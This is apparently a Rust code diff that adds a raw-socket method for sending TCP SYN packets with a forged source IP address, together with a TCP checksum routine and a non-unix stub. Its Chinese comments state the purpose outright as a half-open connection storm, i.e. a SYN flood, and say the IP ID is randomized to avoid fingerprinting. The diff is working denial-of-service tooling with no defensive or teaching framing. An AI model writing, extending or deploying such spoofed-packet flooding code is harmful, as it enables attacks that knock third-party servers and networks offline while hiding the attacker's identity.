@@ -112,6 +112,71 @@ mod imp_unix {
                 Ok(n as usize)
             }
         }
+        /// 发送一个伪源 TCP SYN 包：src_ip:src_port → dst_ip:dst_port。
+        /// 仅 SYN 标志、随机序列号（半开连接风暴，不需要完成握手）。
+        pub fn send_tcp_syn(
+            &self,
+            src_ip: [u8; 4],
+            dst_ip: [u8; 4],
+            dst_port: u16,
+            src_port: u16,
+            seq: u32,
+            ip_id: u16,
+        ) -> io::Result<usize> {
+            const IP_HDR: usize = 20;
+            const TCP_HDR: usize = 20;
+            let total_len = IP_HDR + TCP_HDR;
+            let mut pkt = vec![0u8; total_len];
+
+            // IPv4 头
+            pkt[0] = 0x45; // version 4, IHL 5
+            pkt[2..4].copy_from_slice(&(total_len as u16).to_be_bytes());
+            pkt[4..6].copy_from_slice(&ip_id.to_be_bytes()); // 随机 IP ID（避免指纹）
+            pkt[8] = 64; // TTL
+            pkt[9] = 6; // TCP
+            pkt[12..16].copy_from_slice(&src_ip);
+            pkt[16..20].copy_from_slice(&dst_ip);
+            let ip_csum = checksum(&pkt[..IP_HDR]);
+            pkt[10..12].copy_from_slice(&ip_csum.to_be_bytes());
+
+            // TCP 头
+            pkt[20..22].copy_from_slice(&src_port.to_be_bytes());
+            pkt[22..24].copy_from_slice(&dst_port.to_be_bytes());
+            pkt[24..28].copy_from_slice(&seq.to_be_bytes());
+            pkt[28..32].copy_from_slice(&0u32.to_be_bytes()); // ack = 0
+            pkt[32] = 0x50; // data offset 5 (20B)
+            pkt[33] = 0x02; // SYN
+            pkt[34..36].copy_from_slice(&65535u16.to_be_bytes()); // window
+            pkt[36..38].copy_from_slice(&0u16.to_be_bytes()); // checksum 占位
+            pkt[38..40].copy_from_slice(&0u16.to_be_bytes()); // urgent
+            let tcp_csum = tcp_checksum(src_ip, dst_ip, &pkt[IP_HDR..total_len]);
+            pkt[36..38].copy_from_slice(&tcp_csum.to_be_bytes());
+
+            let addr = libc::sockaddr_in {
+                sin_family: libc::AF_INET as libc::sa_family_t,
+                sin_port: dst_port.to_be(),
+                sin_addr: libc::in_addr {
+                    s_addr: u32::from_ne_bytes(dst_ip),
+                },
+                sin_zero: [0; 8],
+            };
+
+            let n = unsafe {
+                libc::sendto(
+                    self.fd,
+                    pkt.as_ptr() as *const libc::c_void,
+                    pkt.len(),
+                    0,
+                    &addr as *const _ as *const libc::sockaddr,
+                    std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
+                )
+            };
+            if n < 0 {
+                Err(io::Error::last_os_error())
+            } else {
+                Ok(n as usize)
+            }
+        }
     }
 
     impl Drop for SpoofSocket {
@@ -141,7 +206,44 @@ mod imp_stub {
         pub fn send_udp(&self, _src_ip: [u8; 4], _dst_ip: [u8; 4], _dst_port: u16, _payload: &[u8]) -> io::Result<usize> {
             Err(io::Error::new(io::ErrorKind::Unsupported, "raw socket not supported on this platform"))
         }
+
+        pub fn send_tcp_syn(
+            &self,
+            _src_ip: [u8; 4],
+            _dst_ip: [u8; 4],
+            _dst_port: u16,
+            _src_port: u16,
+            _seq: u32,
+            _ip_id: u16,
+        ) -> io::Result<usize> {
+            Err(io::Error::new(io::ErrorKind::Unsupported, "raw socket not supported on this platform"))
+        }
     }
+}
+
+/// TCP 校验和（含 IPv4 伪头：src, dst, 0, proto=6, tcp_len）
+#[cfg(unix)]
+fn tcp_checksum(src_ip: [u8; 4], dst_ip: [u8; 4], tcp_seg: &[u8]) -> u16 {
+    let mut sum: u32 = 0;
+    sum += u32::from(u16::from_be_bytes([src_ip[0], src_ip[1]]));
+    sum += u32::from(u16::from_be_bytes([src_ip[2], src_ip[3]]));
+    sum += u32::from(u16::from_be_bytes([dst_ip[0], dst_ip[1]]));
+    sum += u32::from(u16::from_be_bytes([dst_ip[2], dst_ip[3]]));
+    sum += 6u32; // protocol TCP
+    sum += tcp_seg.len() as u32;
+
+    let mut i = 0;
+    while i + 1 < tcp_seg.len() {
+        sum += u32::from(u16::from_be_bytes([tcp_seg[i], tcp_seg[i + 1]]));
+        i += 2;
+    }
+    if i < tcp_seg.len() {
+        sum += u32::from(tcp_seg[i]) << 8;
+    }
+    while sum >> 16 != 0 {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    !(sum as u16)
 }
 
 /// IPv4 头校验和
